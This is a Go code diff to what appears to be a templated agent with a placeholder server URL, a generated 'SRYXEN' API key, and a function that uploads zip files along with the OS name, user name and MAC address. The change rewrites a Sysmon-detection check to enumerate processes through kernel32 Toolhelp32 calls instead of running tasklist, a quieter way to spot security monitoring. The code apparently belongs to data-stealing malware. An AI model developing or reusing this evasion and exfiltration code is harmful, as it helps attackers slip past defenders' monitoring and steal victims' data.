@@ -12,7 +12,11 @@ import (
 	"strings"
 	"io"
 	"crypto/tls"
+
+	
 	"syscall"
+	"unsafe"
+
 )
 
 const (
@@ -22,6 +26,31 @@ const (
 	serverURL = "%SERVER_URL_HERE%" + "/logAgent"
 	apiKey    = "%SRYXEN_API_KEY_GENERATED%"
 )
+
+var (
+	kernel32             = syscall.NewLazyDLL("kernel32.dll")
+	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
+	procProcess32First   = kernel32.NewProc("Process32FirstW")
+	procProcess32Next    = kernel32.NewProc("Process32NextW")
+)
+
+const (
+	TH32CS_SNAPPROCESS = 0x00000002
+)
+
+type ProcessEntry32 struct {
+	Size              uint32
+	CntUsage          uint32
+	ProcessID         uint32
+	DefaultHeapID     uintptr
+	ModuleID          uint32
+	Threads           uint32
+	ParentProcessID   uint32
+	PriorityClassBase int32
+	Flags             uint32
+	ExeFile           [syscall.MAX_PATH]uint16
+}
+
 
 func main() {
 	if CheckForSysmon() {
@@ -93,18 +122,26 @@ func main() {
 }
 
 func CheckForSysmon() bool {
-	cmd := exec.Command("tasklist")
-	var out bytes.Buffer
-	cmd.Stdout = &out
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-
-	err := cmd.Run()
-	if err != nil {
-		log.Printf("Error running tasklist command: %v", err)
+	handle, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
+	if handle < 0 {
+		log.Println("Failed to create toolhelp snapshot")
 		return false
 	}
+	defer syscall.CloseHandle(syscall.Handle(handle))
 
-	return strings.Contains(out.String(), "sysmon.exe")
+	var entry ProcessEntry32
+	entry.Size = uint32(unsafe.Sizeof(entry))
+
+	ret, _, _ := procProcess32First.Call(handle, uintptr(unsafe.Pointer(&entry)))
+	for ret != 0 {
+		processName := syscall.UTF16ToString(entry.ExeFile[:])
+		if strings.EqualFold(processName, "sysmon.exe") {
+			return true
+		}
+		ret, _, _ = procProcess32Next.Call(handle, uintptr(unsafe.Pointer(&entry)))
+	}
+
+	return false
 }
 
 func sendZipFile(serverURL, filePath, osName, userName, macAddress string) error {
